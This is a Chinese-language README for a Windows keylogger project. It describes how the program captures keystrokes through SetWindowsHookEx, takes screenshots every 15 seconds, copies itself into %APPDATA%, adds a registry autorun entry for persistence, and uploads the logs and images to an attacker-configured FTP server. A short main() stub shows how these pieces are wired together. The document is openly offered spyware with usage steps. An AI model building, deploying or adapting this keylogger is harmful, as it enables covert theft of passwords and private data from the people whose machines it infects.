# Keylogger（键盘记录、截屏、ftp传输）

## 基本原理
  1、通过WinAPI：SetWindowsHookEx进行键盘信息记录，记录结果形成一个txt文件，保存在%APPDATA%/IAMLOG/路径下，。\
  2、定时截图（默认间隔15秒），图片保存在%APPDATA%/IAMLOG/路径下，。\
  3、一个单独的线程定时通过ftp发送txt文件和图片文件，上传后的图片名称带有时间戳。\
  4、程序第一次运行时会把自己复制到%APPDATA%/IAMLOG/路径下，并把相应路径写入注册表启动项，以后开机自动运行。

## FTP服务器：FileZilla
  使用方法比较简单，配置好服务器后将IP、端口号、用户名、密码更新到BCKeylogger.cpp中。

## 使用方法
  主要文件：BCKeylogger.h和BCKeylogger.cpp\
  在主文件中引用头文件，并通过子线程调用Keylogger的主要功能，参考main.cpp主函数中的调用方法，如下所示：
  ```
  #include <thread>
  #include "BCKeylogger.h"

  using namespace std;

  int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
  {
	  userpath();
	  AutoCopy();
	  AutoStart();

	  std::thread t1(StartKeyLogging);
	  std::thread t2(sendfileProcess);

	  t1.join();
	  t2.join();
  }
  ```
## 编译环境
   Win7x64\
   Visual Studio 2017


## 主要参考了以下两个Github的代码
  [ajayrandhawa/Blackcat-Keylogger](https://github.com/ajayrandhawa/Blackcat-Keylogger)\
  [vim2meta/keylogger](https://github.com/vim2meta/keylogger)
